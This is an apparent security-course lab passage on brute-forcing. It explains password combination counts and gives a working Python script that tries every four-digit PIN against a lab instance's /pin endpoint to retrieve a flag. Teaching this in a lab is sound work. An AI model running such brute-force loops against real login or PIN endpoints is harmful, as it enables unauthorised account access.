- To truly grasp the challenge of brute forcing, it's essential to understand the underlying mathematics. 
- The following formula determines the total number of possible combinations for a password:

```
Possible Combinations = Character Set Size^Password Length
```

# Cracking the PIN
---
- The instance application **generates a random 4-digit PIN and exposes an endpoint (`/pin`) that accepts a PIN as a query parameter**. 
- If the provided PIN matches the generated one, the **application responds with a success message and a flag**. Otherwise, it returns an error message.

- We will use this simple demonstration Python script to brute-force the `/pin` endpoint on the API.  You only need to modify the IP and port variables to match your target system information.

```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Try every possible 4-digit PIN (from 0000 to 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")
    print(f"Attempted PIN: {formatted_pin}")

    # Send the request to the server
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # Check if the server responds with success and the flag is found
    if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```